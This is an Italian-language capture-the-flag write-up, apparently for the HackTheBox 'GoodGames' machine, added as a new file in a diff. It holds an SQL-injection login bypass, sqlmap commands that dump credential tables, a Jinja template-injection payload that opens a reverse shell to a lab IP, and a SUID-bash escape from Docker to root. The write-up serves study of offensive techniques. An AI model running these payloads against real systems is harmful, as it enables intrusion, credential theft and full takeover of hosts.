@@ -1,0 +1,45 @@
+Sito vulnerabile a SQL Injections, si puo quindi procedere con SQLMap per verificare le vulnerbilità.
+
+Guardo un po' in giro per il sito
+
+Visto che è vulnerabile se intercetto il traffico con burpsuite e immetto le seguenti credenziali (modificandole con Burpsuite)
+username=' OR '1' = '1' --&password=test  
+
+Entro nel sito come admin
+Ho accesso ad un nuovo sito: http://internal-administration.goodgames.htb/
+
+Non conosco le credenziali ma ho accesso al database, posso quindi risalire alle credenziali tramite il tool
+
+Si inizia salvando la richiesta in un file, poi
+sqlmap -r file 
+[trovo parametro vulnerabile]
+sqlmap -r file -p parametro
+[trovo il database]
+sqlmap -r file -p parametro --tables -D database
+[trovo le tabelle]
+sqlmap -r file -p parametro --dump -D database -T tabella
+
+Trovo username e password in hash
+Dal sito crackstation posso decodificarla senza sapere il tipo di codifica
+https://crackstation.net/
+
+Sono dentro. Noto che un input è vulnerabile a template injection in quanto se mento 
+{{7*7}} la risposta è 49
+
+Posso inserire una reverse shell.
+Cerco semplicemente e flask usa jinja, il payload è il seguente
+{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.10/443 0>&1"').read()}}
+
+mando con ncat e sono dentro come root
+
+Per upgreadare la shell (importante)
+script /dev/null bash
+
+Noto pero' che la cartella root non ha nulla dentro, molto strano. Osservando un po' vedo che l'ip è 172... capisco quindi di essere in un docker container.
+È comunque possibile accedere ad un utente, augustus.
+
+Per accedere ad una shell di tipo root procedo quindi a copiare il comando bash all'interno della cartella user accedibile anche dal docker.
+Torno come root docker e cambio i privilegi della bash
+Torno un'ultima volta come augustus e avvio la bash che in questo caso mi garantisce privilegi da amministratore.
+
+Posso a questo punto prendere la flag del root
